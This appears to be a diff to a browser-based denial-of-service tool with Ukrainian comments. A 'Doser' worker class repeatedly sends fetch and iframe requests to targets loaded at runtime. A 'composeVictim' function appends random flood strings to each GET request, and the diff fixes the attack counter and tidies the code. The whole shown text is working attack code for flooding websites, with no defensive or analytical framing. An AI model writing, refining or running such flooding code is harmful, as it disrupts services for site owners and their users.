@@ -1,13 +1,14 @@
-const fetchAttackInterval = 500
-const iframeAttackInterval = 600
+const fetchAttackInterval = 500;
+const iframeAttackInterval = 600;
 
 /**
  * Зберігання данних про атаки
  */
-function add_count() {
+function add_count(e) {
 	if (!lockAttackCount) {
 		attacks.text(parseInt(attacks.text()) + 1);
-    	(d=>d.attacks = d.attacks ? parseInt(d.attacks) : 0 + 1)(Database)
+
+    	(d=>d.attacks = (d.attacks ? parseInt(d.attacks) : 0) + 1)(Database)
 	} 
 }
 
@@ -27,7 +28,7 @@ function setTarget(target) {
  * Генерація **GET** запиту
  * @param {JSON} target **Ціль**
  */
-const composeVictim = async target => `${target.page}?data=${randomString(64)}`;
+const composeVictim = async target => `${target.page}?q=${floodString(64)}`;
 
 /**
  * Воркер
@@ -39,13 +40,13 @@ class Doser {
 	 */
     async start(isFetch=true) {
     	this.attack = true; // Статус атаки
-    	lockAttackCount = false // Розблокування лічильника
+    	lockAttackCount = false; // Розблокування лічильника
 
         // Запуск атаки
         btn.text("Стоп");
 
         // Створення сповіщення про завантаження цілей
-        (l=>{if (l[0]) l.remove()})($("#load"))
+        (l=>{if (l[0]) l.remove()})($("#load"));
 		$("<p>", {id:"load"}).text("Завантажуємо цілі...").appendTo(box);
 
         const target = await getTarget();
